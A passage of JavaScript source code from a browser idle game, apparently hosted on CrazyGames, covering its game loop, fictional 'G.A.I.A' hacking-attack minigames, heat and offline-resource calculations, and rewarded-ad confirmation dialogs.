	//=============h_s==============
	set_hardware_menu_items()
	set_hardware_prices()
	check_h_item_price()
	$("#h_section").click()

	set_software_menu_items()
	check_s_item_price()
	//====================================

	//=============achievement============
	generate_achievement_html_elements()
	onclose_a_menu_bonus_cps = Game.permanent.achievementsMulti
	//===================================

	//=============Store============
	set_hq_store_item_price(hq_bundle)
	set_hqStore_items()
	set_onlineStore_items()
	set_dl_items()
	//===================================

	//===============Task===============
	mnewsel = Game.impermanent.task
	task = Game.impermanent.task
	if(task == mnewsel && task_isPauseed)
		$("#tasks_section").css("box-shadow", "inset 0px 0px 2% var(--selectClr)")
	else if(task == mnewsel && !task_isPauseed) {
		$("#tasks_section").css("box-shadow", "")
	}
	$("#"+difficulty).css("border", "1px solid var(--selectClr)")
	init_contribution_rewards()
	setActiveTask()
	activeTask()
	toggle_task()
	set_task_diffculity()
	//====================================

	//===========Bot manager=============
	set_bot_manager()
	check_bot_item_price()
	//===================================
	
	update_main_resouces()

	if(Game.impermanent.g_eff.effects.length > 0) {
		g_eff_t_isruniing = true
		$("#g_eff_timer_txt").text(Game.impermanent.g_eff.effects[Game.impermanent.g_eff.effects.length-1].time+"s")
		set_view_multi_state()
	}

	//===========AD=============
	set_ads_buttons()
	$("#ad_gift_text").text(Game.impermanent.gift_text)
	$("#ad_gift_icon").empty()
	create_svg(0, Game.impermanent.gift_icon, "ad_gift_icon")
	$("#ad_gift_refresh_timer").text(formatTimeMinute(Game.impermanent.ad_gift_timer))
 	$("#ad_gift_timer_text").text(formatTimeMinute(Game.impermanent.ad_gift_timer))
	//===================================

 	set_up_settings()
	Events["NEW_ACC0"]()
	Events["FIRST_FORMAT"]()

	cal_hibernate()
	active_clock = setArrayTimeout(TimeTick, 1000)
	check_threat()

	if(CGEnvironment)
		window.CrazyGames.SDK.game.gameplayStart()
}

function stop_game() {
	for(i = 0; i < timers_IDs.length; i++) {
		clearTimeout(timers_IDs[i])
		remove_timeoutID(timers_IDs[i])
		i--
	}
}

function ad_gift_timer() {
	if(!Game.impermanent.ad_gift_taken) {
 		Game.impermanent.ad_gift_timer -= 1
 		$("#ad_gift_refresh_timer").text(formatTimeMinute(Game.impermanent.ad_gift_timer))
 		if(Game.impermanent.ad_gift_timer <= 0) {
 			Game.impermanent.ad_gift_timer = 300
 			generate_ad_gift()
 		}
  }
  else {
  	Game.impermanent.ad_gift_timer -= 1
 		$("#ad_gift_timer_text").text(formatTimeMinute(Game.impermanent.ad_gift_timer))
 		if(Game.impermanent.ad_gift_timer <= 0) {
 			Game.impermanent.ad_gift_timer = 300
 			Game.impermanent.ad_gift_taken = false
 			$("#ad_gift_timer").css("display", "none")
 			$("#ad_gift_refresh_timer").text("05m:00s")
 			generate_ad_gift()
 		}
  }
}

function TimeTick() {	
  //===============Time=======================
  increase_time(1)
  //==========================================

  //===============AD gift timer==============
  ad_gift_timer()
  //==========================================

 //===============Effects timer===============
  if(g_eff_t_isruniing)
  	effect_timer()
  //==========================================

  //===============CPS ticker=================
  increase_credit(cps)
  //==========================================

  //===================data===================
  increase_data(dps)
  //==========================================

  //===============crown coin=================
  crown_coin()
  //==========================================

	//===============bot manager================
  mtrls_timer -= 1
  if(mtrls_timer <= 0) {
  	increase_materials(mpm)
  	mtrls_timer = 60
  }

  if(auto_clicker_on)
		auto_clicker()
  //==========================================

	//===============G.A.I.A attack=============
  //increase time when there is no attack happening right now
  if(!is_attack && !in_ad) {
  	Game.impermanent.gaia_attack_cycle +=1
  	 //15mins+
	  if(Game.impermanent.gaia_attack_cycle >= 900-Game.permanent.gaia_difficulty) {
	  	//chance of attack happen once every half minute 
	  	if((Math.floor(Game.impermanent.gaia_attack_cycle-900))%30 == 0) {
	    	let percentage = 7.5+parseInt((Game.impermanent.gaia_attack_cycle-900)/60) // increase chance by 0.5 every minute 
	    	let r = ranged_random(100, 1)
	    	//activate attack
	    	if(r <= percentage) {
	    		is_attack = true
		    	Game.permanent.total_gaia_hack++
		    	//get random attack type and difficulty
					atkType = ranged_random(3,1)
					r = ranged_random(100, 0)

					if(r+Game.permanent.gaia_difficulty/7 < 75) 
						attack_difficulty = 1
					else if(r+Game.permanent.gaia_difficulty/7 < 90) 
						attack_difficulty = 2
					else if(r+Game.permanent.gaia_difficulty/7 < 97) 
						attack_difficulty = 3
					else 
						attack_difficulty = 4

					Game.impermanent.gaia_attack_cycle = 0;

					//check if auto block is ON
	    		if(Game.permanent.auto_block || auto_block) {
	    			rr = ranged_random(100, 0)
	    			if(rr < Game.impermanent.fire_wall*100)
	    				end_attack(2)
	    			else
	    				end_attack(1)
	    		}
	    		else {
		    		//base: 45 + 6(logo animation time)
						attack_timer = 50
						$("#console-text").blur()
						$("#console-text").val("")

						switch(atkType) {
							case 1:
								$("#atkType").text("Crack Password")
								$("#atk_des").text("Solve given problems to crack the password")
								break
							case 2:
								$("#atkType").text("Fake certificates")
								$("#atk_des").text("Type in the given Fake certificates")
								break;
							case 3:
								$("#atkType").text("Blocker")
								$("#atk_des").text("Reach Goal, Change direction using arrow keys, do not get blocked")
								break
						}
						switch(attack_difficulty) {
							case 1:
								$("#atkDif").text("Easy")
								break
							case 2:
								$("#atkDif").text("Normal")
								break
							case 3:
								$("#atkDif").text("Hard")
								break
							case 4:
								$("#atkDif").text("Impossible")
								break;
						}
						start_hack_animation()
					}
				}
	 		}
	  }
  }
  else if(is_attack) {
  	attack_timer--;
  	$("#atkTimer").text(attack_timer+"s")
  	//end attack >> attack successful
  	if(attack_timer <= 0)
			end_attack(1)
  }
  //==========================================

	//===============Online Store===============
  if(Game.impermanent.ol_unlocked) {
  	Game.impermanent.online_store_cycle -= 1
		if(Game.impermanent.online_store_cycle <= 0) {
			Game.impermanent.online_store_cycle = 600-Game.permanent.ol_timer_reduce
			generate_onlineStore_items()
			log("<br>> <span style='color: var(--olRefreshClr);'>Online Store</span> items refreshed.", "sys")
			check_onlineStore_item_price()
		}
	$("#store_timer").text(" "+formatTime(Game.impermanent.online_store_cycle))

	if(Game.impermanent.dl_items.length > 0) 
		cal_dl_items()
  }
	//==========================================

  //===============Heat ticker==============
	heat_cycle -= 1
	if(heat_cycle <= 0) {
		heat_cycle = 10
		if(Game.impermanent.heatU < heatMU) {
			Game.impermanent.heatU += heatHA
			$("#heat_arrow").css("display", "block")
			$("#heat_arrow").css("transform", "rotate(0deg)")
			if(Game.impermanent.heatU >= 50)
				Events["HEAT_50"]()
			if(Game.impermanent.heatU > heatMU) 
				Game.impermanent.heatU = heatMU
			$("#degree_heat").html(Game.impermanent.heatU.toFixed(0)+'<span style="font-size: 14px;">&#8451;</span>')
			update_main_resouces()
			if(sys_newperf == "perf_res_fan_btn")
				update_peformance_heat()
	  }
	  else if(heatMU < Game.impermanent.heatU) {
	    Game.impermanent.heatU -= heatCA
	    $("#heat_arrow").css("display", "block")
	    $("#heat_arrow").css("transform", "rotate(180deg)")
	    if(Game.impermanent.heatU < heatMU)
	    	Game.impermanent.heatU = heatMU
	    $("#degree_heat").html(Game.impermanent.heatU.toFixed(0)+'<span style="font-size: 14px;">&#8451;</span>')
	    update_main_resouces()
	   	if(sys_newperf == "perf_res_fan_btn")
				update_peformance_heat()
	  }
	  else if (Game.impermanent.heatU == heatMU){
	  	$("#heat_arrow").css("display", "none")
	  }
	  //destroy random hardware item each tick
		if(Game.impermanent.heatU > heatM) {
			Events["HEAT_95"]()
			log("<br>> <span style='color: var(--negativeClr);'>Warning</span>, System temperature is too high!", "sys")
			if((Game.impermanent.heatU - heatM)*5.5 > ranged_random(100, 1)) {
				let x = ranged_random(Game.impermanent.hardware_in_list.length, 1)
				if(Game.impermanent.hardware_count["h"+x] > 0) {
					Game.impermanent.hardware_count["h"+x]--
					$("#h_item_"+(x-1)).text(simplifyNumberSmall(Game.impermanent.hardware_count["h"+x]))
					if(x == 6) 
						Observer["MISCELLANEOUS"]["REDUCE_HARDWARE"]("h6")
					Game.impermanent.total_hardware--
					log("<br>> 1 "+hardwares["h"+x].name+" destroyed due System overheat!", "sys")
				}	
			}
			CalResources()
			if(sys_newperf == "perf_res_fan_btn")
				update_peformance_heat()
		}
		else if(Game.impermanent.heatU < heatCM) {
			Events["HEAT_0"]()
			log("<br>> <span style='color: var(--negativeClr);'>Warning</span>, System temperature is too low!", "sys")
			if((heatCM - Game.impermanent.heatU)*11 > ranged_random(100, 1)) {
				let x = ranged_random(Game.impermanent.hardware_in_list.length, 1)
				if(Game.impermanent.hardware_count["h"+x] > 0) {
					Game.impermanent.hardware_count["h"+x]--
					$("#h_item_"+(x-1)).text(simplifyNumberSmall(Game.impermanent.hardware_count["h"+x]))
					if(x == 6) 
						Observer["MISCELLANEOUS"]["REDUCE_HARDWARE"]("h6")
					Game.impermanent.total_hardware--
					log("<br>> 1 "+hardwares["h"+x].name+" failed due System overcooling!", "sys")
				}	
			}
			CalResources()
			if(sys_newperf == "perf_res_fan_btn")
				update_peformance_heat()
		}	
	}
	//==========================================

	//===============Auto Save Cycle============
	autoSave_cycle -= 1;
	if(autoSave_cycle <= 0) {
		autoSave_cycle = 180
		UpdateSave()
	}
	//==========================================

	active_clock = setArrayTimeout(TimeTick, 1000-time_diff)
}

function check_click() {
	current_click_ps++;
	$("#click_ratio").text(click_ratio.toFixed(2));
	return true;
}

function opne_makesure(type) {
	$('#make_sure').css('display', 'flex')
	switch(type) {
		case "del":
			$("#menue_title_bar_title").text("Delete")
			$("#make_sure_content").html("Are you sure to Permanently DELETE current save file?")
			$("#confirm_btn").off("click").on("click", function() {
				del_save_file()
			})
			$("#confirm_btn").text("DELETE")
			break
		case "res":
			$("#menue_title_bar_title").text("Reset")
			$("#make_sure_content").html("Are you sure to Permanently RESET current save file?")
			$("#confirm_btn").off("click").on("click", function() {
				res_save_file()
			})
			$("#confirm_btn").text("RESET")
			break
		case "frmt":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Formatting the System will:<br>1- Gain the 'Next' bonus CPS<br>2- Activate all researches effects<br>3- Reset Hardwares, Softwares, and Store<br>4- Reduce Threat to 0%<br>5- G.A.I.A will gain +1 difficulty<br>Are you sure?")
			$("#confirm_btn").off("click").on("click", function() {
				format()
			})
			$("#confirm_btn").text("FORMAT")
			break
		case "forced_frmt":
			$("#menue_title_bar_title").text("Warnning");
			$("#make_sure_content").html("Threat reached to 100%<br>"+con_span("G.A.I.A ", "var(--gaiaClr)")+"has taken control over the System and you no longer have access to it, to gain access back to it, you are required to Format the System")
			$("#confirm_btn").off("click").on("click", function() {
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("OK")
			break
		case "ad_cps":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Watch AD to get &times;2 CPS Multiplier for 10 minutes?")
			$("#confirm_btn").off("click").on("click", function() {
				if(CGEnvironment)
					if(!ad_block)
						window.CrazyGames.SDK.ad.requestAd('rewarded', ad_callbacks)
					else
						log('<br>> '+con_span(ad_str_msg, 'var(--negativeClr)'), 'sys')
				else
					log('<br>> '+con_span("Anable to start AD,", 'var(--negativeClr)')+" something went wrong!", 'sys')
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("Watch")
			break
		case "ad_cps2":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Watch AD to extended CPS Multiplier duration by 5 minutes<br>and increase effect to &times;4?")
			$("#confirm_btn").off("click").on("click", function() {
				if(CGEnvironment)
					if(!ad_block)
						window.CrazyGames.SDK.ad.requestAd('rewarded', ad_callbacks)
					else
						log('<br>> '+con_span(ad_str_msg, 'var(--negativeClr)'), 'sys')
				else
					log('<br>> '+con_span("Anable to start AD,", 'var(--negativeClr)')+" something went wrong!", 'sys')
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("Watch")
			break
		case "ad_cps4":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Watch AD to extended CPS Multiplier duration by 5 minutes<br>and increase effect to &times;8?")
			$("#confirm_btn").off("click").on("click", function() {
				if(CGEnvironment)
					if(!ad_block)
						window.CrazyGames.SDK.ad.requestAd('rewarded', ad_callbacks)
					else
						log('<br>> '+con_span(ad_str_msg, 'var(--negativeClr)'), 'sys')
				else
					log('<br>> '+con_span("Anable to start AD,", 'var(--negativeClr)')+" something went wrong!", 'sys')
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("Watch")
			break
		case "ad_dps":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Watch AD to get &times;2 DPS Multiplier for 10 minutes?")
			$("#confirm_btn").off("click").on("click", function() {
				if(CGEnvironment)
					if(!ad_block)
						window.CrazyGames.SDK.ad.requestAd('rewarded', ad_callbacks)
					else
						log('<br>> '+con_span(ad_str_msg, 'var(--negativeClr)'), 'sys')
				else
					log('<br>> '+con_span("Anable to start AD,", 'var(--negativeClr)')+" something went wrong!", 'sys')
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("Watch")
			break
		case "ad_dps2":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Watch AD to extended DPS Multiplier duration by 5 minutes<br>and increase effect to &times;4?")
			$("#confirm_btn").off("click").on("click", function() {
				if(CGEnvironment)
					if(!ad_block)
						window.CrazyGames.SDK.ad.requestAd('rewarded', ad_callbacks)
					else
						log('<br>> '+con_span(ad_str_msg, 'var(--negativeClr)'), 'sys')
				else
					log('<br>> '+con_span("Anable to start AD,", 'var(--negativeClr)')+" something went wrong!", 'sys')
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("Watch")
			break
		case "ad_dps4":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Watch AD to extended DPS Multiplier duration by 5 minutes<br>and increase effect to &times;8?")
			$("#confirm_btn").off("click").on("click", function() {
				if(CGEnvironment)
					if(!ad_block)
						window.CrazyGames.SDK.ad.requestAd('rewarded', ad_callbacks)
					else
						log('<br>> '+con_span(ad_str_msg, 'var(--negativeClr)'), 'sys')
				else
					log('<br>> '+con_span("Anable to start AD,", 'var(--negativeClr)')+" something went wrong!", 'sys')
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("Watch")
			break
		case "ad_gift":
			$("#menue_title_bar_title").text("Confirm");
			$("#make_sure_content").html("Watch AD to Get "+$("#ad_gift_text").text()+"?")
			$("#confirm_btn").off("click").on("click", function() {
				if(CGEnvironment)
					if(!ad_block)
						window.CrazyGames.SDK.ad.requestAd('rewarded', ad_callbacks)
					else
						log('<br>> '+con_span(ad_str_msg, 'var(--negativeClr)'), 'sys')
				else
					log('<br>> '+con_span("Anable to start AD,", 'var(--negativeClr)')+" something went wrong!", 'sys')
				$('#make_sure').css('display', 'none')
			})
			$("#confirm_btn").text("Watch")
			break
		}/*
		case "sus":
			$("#makesure").dialog({
				title: 'Warning',
			});
			$("#makesure_text").html("Suspicious behavior detected<br>3 warnings remaining<br>before deleting this save file PERMANENTLY as a punishment");
			$("#makesure_btn").off("click").on("click", function() {
				$("#hacked_view").css("display", "none");
				close_menu("makesure");
			});
			$("#makesure_btn").text("OK");
			$("#makesure_btn").prop("disabled", true);
			$("#makesure_btn").css("filter" , "brightness(0.6)");
			break;
	}*/
}

function cal_hibernate() {
	if(!is_attack && !in_ad && Game.impermanent.threat < 100 && Game.permanent.hibernate_duration > 0) {
		b_credit = 0
		b_data = 0
		b_materials = 0
		time_elapsed = Math.floor((new Date().getTime()-Game.impermanent.game_close_time)/1000)
	 	if(time_elapsed >= Game.permanent.hibernate_duration*3600)
	 		time_elapsed = Game.permanent.hibernate_duration*3600

	 	Game.impermanent.ad_gift_timer -= time_elapsed
		ad_gift_timer()
		if(Game.impermanent.ad_gift_timer <= 0)
			Game.impermanent.ad_gift_timer = 300-(time_elapsed%300)

	 	eff_t = cal_effecs_inbackground()
	 	time_elapsed -= eff_t

	 	if(time_elapsed < 0)
	 		time_elapsed = 0

		b_credit += parseFloat((time_elapsed*cps*Game.permanent.offline_credit_multi).toFixed(3))
		b_data += Math.floor(time_elapsed*dps*Game.permanent.offline_data_multi)
		b_materials += preciseNumber(preciseNumber(mpm, Math.floor(time_elapsed/60), "*", 3), Game.permanent.offline_materials_multi, "*", 3)
		increase_credit(b_credit)
		increase_data(b_data)
		increase_materials(b_materials)

		$("#idle_hiber_report_title").text("Hibernate report")
		$("#idle_for_t").text("Hibernate for")
		$("#gen_credit_t").text("Generated Credit")
		$("#gen_data_t").text("Decoded Data")
		$("#gen_mtrl_t").text("Produced Materials")
		$("#suc_hack_t").text("Current CPS")
		$("#hack_blocked_t").text("Current DPS")
		$("#idle_curr_mtrl_t").text("Current MPM")
		$("#threat_gained_t").text("CPS percentage")
		$("#idle_heat_t").text("DPS percentage")
		$("#idle_mrtl_t").text("MPM percentage")
		
		$("#report_heat_r").css("display", "table-row")
		$("#idle_curr_mtrl_r").css("display", "table-row")
		$("#idle_mrtl_r").css("display", "table-row")
		$("#idle_for_v").text(formatTime(time_elapsed))
		$("#gen_credit_v").text(simplifyNumber(b_credit))
		$("#gen_data_v").text(get_data_with_symbol(b_data, 3))
		$("#gen_mtrl_v").text(simplifyNumber(b_materials))
		$("#suc_hack_v").text(simplifyNumber(cps))
		$("#hack_blocked_v").text(get_data_with_symbol(dps, 3))
		$("#idle_curr_mtrl_v").text(simplifyNumber(mpm))
		$("#threat_gained_v").text(Game.permanent.offline_credit_multi*100+"%")
		$("#idle_heat_v").text(Game.permanent.offline_data_multi*100+"%")
		$("#idle_mrtl_v").text(Game.permanent.offline_materials_multi*100+"%")

		$("#suc_hack").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#credit'></use></svg>")
		$("#hack_blocked").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#data'></use></svg>")
		$("#idle_curr_mtrl").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#materials'></use></svg>")
		$("#threat_gained").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#swipe_card'></use></svg>")
		$("#idle_heat").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#unplugged'></use></svg>")
		$("#idle_mrtl").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#foundry_bucket'></use></svg>")
		$("#idle_hiber_report").css("display", "flex")
	}
}

function cal_effecs_inbackground() {
	let = eff_t = 0
	for(i = Game.impermanent.g_eff.effects.length-1; i >= 0; i--) {
		temp = Game.impermanent.g_eff.effects[i].time
		Game.impermanent.g_eff.effects[i].time -= time_elapsed
		if(Game.impermanent.g_eff.effects[i].time <= 0) {
			t = temp
			b_crredit += cps*t
			b_data += dps*t
			b_materials += mpm*Math.floor(t/60)
			eff_t += t
			end_effect(i)
		}
	}

	return eff_t
}

function cal_idle_resources() {
	//===============Cal values===============
	time_elapsed = Math.floor((new Date().getTime()-idle_start)/1000) //total time elapsed in seconds
	idle_elapsed = time_elapsed
	gaia_time = time_elapsed
	hacks = 0
	blocks = 0
	threat = 0
	b_crredit = 0
	b_data = 0
	b_materials = 0
	//gaia hack atttemps simulator for gevin time
	isbreak = false
	while(gaia_time > 0) {
		if(isbreak)
			break
		if(Game.impermanent.gaia_attack_cycle + gaia_time >= 900-Game.permanent.gaia_difficulty) {
			gaia_time = gaia_time-(900-Game.permanent.gaia_difficulty-Game.impermanent.gaia_attack_cycle)
			attempts = Math.floor(gaia_time/30)
			inc = 0
			percentage = 7.5
			for(i = 0; i < attempts; i++) {
				inc++
				if(inc == 2) {
					percentage += 0.5
					inc = 0
				}
				r = ranged_random(100, 1)
				if(r <= percentage) {
					r = ranged_random(100, 1)
					if(r+Game.permanent.gaia_difficulty/7 < 75) 
						attack_difficulty = 1
					else if(r+Game.permanent.gaia_difficulty/7 < 90) 
						attack_difficulty = 2
					else if(r+Game.permanent.gaia_difficulty/7 < 97) 
						attack_difficulty = 3
					else 
						attack_difficulty = 4
					r = ranged_random(100, 1)
					if(r <= Game.impermanent.fire_wall*100)
						blocks++
					else {
						threat += Math.floor(1.25*attack_difficulty)
						hacks++
						if(Game.impermanent.threat+threat >= 100) {
							time_elapsed = gaia_time
							isbreak = true
							break
						}
					}
					Game.impermanent.gaia_attack_cycle = 0
					break
				}
				gaia_time -= 30
			}
		}
		else {
			Game.impermanent.gaia_attack_cycle += gaia_time
			gaia_time = 0
		}
	}
	//cal store
	cal_store_after_idle(time_elapsed)
	//call effects
	
	t_eff = cal_effecs_inbackground()
	time_elapsed -= t_eff

	if(time_elapsed < 0)
	 		time_elapsed = 0

	b_crredit += cps*time_elapsed
	if(auto_clicker_on)
		b_crredit += bm_stat.auto_clicker_inc*time_elapsed
	b_data += dps*time_elapsed
	b_materials += mpm*Math.floor(time_elapsed/60)
	if(b_materials < 0)
		b_materials = 0
	//update views
	$("#idle_hiber_report_title").text("Idle report")
	$("#idle_for_t").text("Idle for")
	$("#gen_credit_t").text("Generated Credit")
	$("#gen_data_t").text("Decoded Data")
	$("#gen_mtrl_t").text("Produced Materials")
	$("#suc_hack_t").text("Succesfull Hacks")
	$("#hack_blocked_t").text("Blocked Hacks")
	$("#threat_gained_t").text("Threat")
	
	$("#report_heat_r").css("display", "none")
	$("#idle_curr_mtrl_r").css("display", "none")
	$("#idle_mrtl_r").css("display", "none")
	$("#idle_for_v").text(formatTime(time_elapsed))
	$("#gen_credit_v").text(simplifyNumber(b_crredit))
	$("#gen_data_v").text(get_data_with_symbol(b_data, 3))
	$("#gen_mtrl_v").text(simplifyNumber(b_materials))
	$("#suc_hack_v").text(hacks)
	$("#hack_blocked_v").text(blocks)
	$("#threat_gained_v").text(threat+"%")

	$("#suc_hack").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#eclipse'></use></svg>")
	$("#hack_blocked").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#shieldcomb'></use></svg>")
	$("#threat_gained").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#format'></use></svg>")
	$("#idle_heat").empty().append("<svg class='idle_menu_col2 lv0_icon'><use xlink:href='#fan'></use></svg>")

	increase_credit(b_crredit)
	increase_data(b_data)
	increase_materials(b_materials)
	increase_time(idle_elapsed)
	Game.permanent.total_gaia_hack += hacks
	Game.permanent.total_gaia_blocked += blocks
	Game.impermanent.threat += threat
	Game.impermanent.ad_gift_timer -= idle_elapsed
	ad_gift_timer()
	if(Game.impermanent.ad_gift_timer <= 0)
			Game.impermanent.ad_gift_timer = 300-(time_elapsed%300)
	update_main_resouces()
	update_current_performance()
	check_threat()
}

//when player leaves tab hidden/background/ad
function start_idle() {
	// player pauses the game
	if(CGEnvironment)
		window.CrazyGames.SDK.game.gameplayStop()
	if(is_attack) {
		end_attack(1)
		end_hack_animation()
	}

	log("<br>> Idle...", "sys")
	//stop game, clear all current timeouts
	stop_game()
	idle_start = new Date().getTime()
}

//when player come back tab Focused/ad
function stop_idle() {
	// player resumes the game
	if(CGEnvironment)
		window.CrazyGames.SDK.game.gameplayStart()

	if(Game.permanent.settings.idle_report && !in_ad) {
		$("#idle_hiber_report").css("display", "flex")
		Events["IDLE_0"]()
	}
	diff_time = (new Date().getTime()-start).toString()
	diff_time = diff_time.substr(diff_time.length-3,diff_time.length)
	diff_time = Number(diff_time)
	active_clock = setArrayTimeout(TimeTick, diff_time)

	cal_idle_resources()
	UpdateSave()
}

function checkTabFocused() {
	if(isLogin && Game.impermanent.threat < 100) {
		//when player come back tab Focused/ad
	  if(document.visibilityState === 'visible') {
	  	auto_block = false
			stop_idle()
	  }
	  else {
	  	auto_block = true
	  	start_idle()
	  }
	}
}

function exit_fullscreen() {
	if(document.exitFullscreen)
    document.exitFullscreen()
  else if(document.webkitExitFullscreen)
    document.webkitExitFullscreen()
  else if(document.mozCancelFullScreen)
    document.mozCancelFullScreen()
  else if(document.msExitFullscreen)
    document.msExitFullscreen()
}

document.addEventListener('visibilitychange', checkTabFocused)

window.addEventListener('beforeunload',  (e) => {
	e.preventDefault()
	if(isLogin) {
		Game.impermanent.game_close_time = new Date().getTime()
		if (document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement)
			exit_fullscreen()

		cancel_format()
		if(is_attack)
			end_attack(1)

		UpdateSave()
	}
})

function end_effect(index) {
	m_name = Game.impermanent.g_eff.effects[index].multi_name
	temp = 1

	//+ for now means it is gaia effect
	if(Game.impermanent.g_eff.effects[index].operator == "+") {
		//use loop to recall all values, since values are indepented but total should not be less than 0.01
		//using seperate variable so the actuall multiplier stay
		for(i = 0; i < Game.impermanent.g_eff.effects.length; i++) {
			if(Game.impermanent.g_eff.effects[i].multi_name == m_name) {
				temp = preciseNumber(temp, Game.impermanent.g_eff.effects[i].effect, "-", 3)
			}
		}
		//now appaly the removed effect normally on temp var
		temp = preciseNumber(temp, Game.impermanent.g_eff.effects[index].effect, Game.impermanent.g_eff.effects[index].operator, 3)
		if(temp < 0.01)
			Game.impermanent.g_eff[m_name] = 0.01
		//since the temp is not less than 0.01, meaning all effects of the same multi are not less than 0.01, hance we can add
		//effect value back normally
		else {
			Game.impermanent.g_eff[m_name] = temp
			//make sure value not creater than 1 other wise it will be as a buff, gaia eff is not a buff
			if(Game.impermanent.g_eff[m_name] > 1)
				Game.impermanent.g_eff[m_name] = 1
		}
	}
	//- for coin and ads effects, they can stack normally to unlimited value, but make sure is not less than 1 when removing effect
	else {
		Game.impermanent.g_eff[m_name] = preciseNumber(Game.impermanent.g_eff[m_name], 
			Game.impermanent.g_eff.effects[index].effect, Game.impermanent.g_eff.effects[index].operator, 3)
		if(Game.impermanent.g_eff[m_name] < 1)
			Game.impermanent.g_eff[m_name] = 1
		//removing ad effect will always reset buttons to x2 it doesn't matter if buff ended on 2, 4, 8
		if(m_name == "ad_credit") {
			$("#ad_cps_text").html("&times;2 CPS")
	    $("#ad_cps_can").css("display", "flex")
	    $("#ad_cps_max").css("display", "none")
	    $("#ad_cps").on('click', function() {
	    	ad_btn = this.id
	    	click_ad_btn()
	    })
	  }
	  else if(m_name == "ad_data") {
			$("#ad_dps_text").html("&times;2 DPS")
	    $("#ad_dps_can").css("display", "flex")
	    $("#ad_dps_max").css("display", "none")
	    $("#ad_dps").on('click', function() {
	    	ad_btn = this.id
	    	click_ad_btn()
	    })
	  }
	}

	remove_view_multi_state(index)
	Game.impermanent.g_eff.effects.splice(index, 1)
	set_view_multi_state()

	CalResources()
}

function generate_effect(time, multi_name, operator, apply_operator, visual_id, icone_id, effect, des, priority) {
	eff = {}
	eff.time = time
	eff.visual_id = visual_id
	eff.icone_id = icone_id
	eff.multi_name = multi_name
	eff.operator = operator
	eff.effect = effect
	eff.des = des
	eff.priority = priority
	//for now only gaia effects use - operator and share same logic!
	if(apply_operator == "-") {
		if(preciseNumber(Game.impermanent.g_eff[multi_name], effect, apply_operator, 3) < 0.01)
			Game.impermanent.g_eff[multi_name] = 0.01
		else
			Game.impermanent.g_eff[multi_name] = preciseNumber(Game.impermanent.g_eff[multi_name],
				effect, apply_operator, 3)
	}
	else if(apply_operator == "+")
		Game.impermanent.g_eff[multi_name] = preciseNumber(Game.impermanent.g_eff[multi_name], effect, apply_operator, 3)

	g_eff_t_isruniing = true

	Game.impermanent.g_eff.effects.push(eff)

	//sort effects descending order based on priority, and descending order in each priority group based on time
	Game.impermanent.g_eff.effects.sort((a, b) => {
    // Sort by priority in descending order
    if (a.priority < b.priority) return 1
    if (a.priority > b.priority) return -1

    // If priorities are equal, sort by time in descending order
    if (a.time < b.time) return 1
    if (a.time > b.time) return -1

    return 0
	})

	$("#g_eff_timer_txt").text(Game.impermanent.g_eff.effects[Game.impermanent.g_eff.effects.length-1].time+"s")

	CalResources()
	set_view_multi_state()
	if(g_eff_clicked)
		onhover_g_eff()
}

function effect_timer() {
	for(i = 0; i < Game.impermanent.g_eff.effects.length; i++) {
		Game.impermanent.g_eff.effects[i].time -= 1
		if(Game.impermanent.g_eff.effects[i].time <= 0) {
			end_effect(i)
		}
	}
	if(Game.impermanent.g_eff.effects.length > 0)
		$("#g_eff_timer_txt").text(Game.impermanent.g_eff.effects[Game.impermanent.g_eff.effects.length-1].time+"s")
	else {
		g_eff_t_isruniing = false
		$("#g_eff_timer_txt").text("")
	}
}

function set_ads_buttons() {
	if(Game.impermanent.g_eff.ad_credit == 1)
		$("#ad_cps_text").html("&times;2 CPS")
	else if(Game.impermanent.g_eff.ad_credit == 2)
		$("#ad_cps_text").html("&times;4 CPS")
	else if(Game.impermanent.g_eff.ad_credit == 4)
		$("#ad_cps_text").html("&times;8 CPS")
	else {
		$("#ad_cps_can").css("display", "none")
	  $("#ad_cps_max").css("display", "flex")
	  $("#ad_cps").off("click")
	}

	if(Game.impermanent.g_eff.ad_data == 1)
		$("#ad_dps_text").html("&times;2 DPS")
	else if(Game.impermanent.g_eff.ad_data == 2)
		$("#ad_dps_text").html("&times;4 DPS")
	else if(Game.impermanent.g_eff.ad_data == 4)
		$("#ad_dps_text").html("&times;8 DPS")
	else {
		$("#ad_dps_can").css("display", "none")
	  $("#ad_dps_max").css("display", "flex")
	  $("#ad_dps").off("click")
	}

	if(Game.impermanent.ad_gift_taken) {
		$("#ad_gift_timer_text").text(formatTimeMinute(Game.impermanent.ad_gift_timer))
		$("#ad_gift_timer").css("display", "flex")
	}
}

function click_ad_btn(id) {
	if(ad_btn == "ad_cps") {
		if(Game.impermanent.g_eff.ad_credit == 1)
      opne_makesure("ad_cps")
    else if(Game.impermanent.g_eff.ad_credit == 2)
      opne_makesure("ad_cps2")
    else if(Game.impermanent.g_eff.ad_credit == 4)
    	opne_makesure("ad_cps4")
  }
  else if(ad_btn == "ad_dps") {
  	if(Game.impermanent.g_eff.ad_data == 1)
      opne_makesure("ad_dps")
    else if(Game.impermanent.g_eff.ad_data == 2)
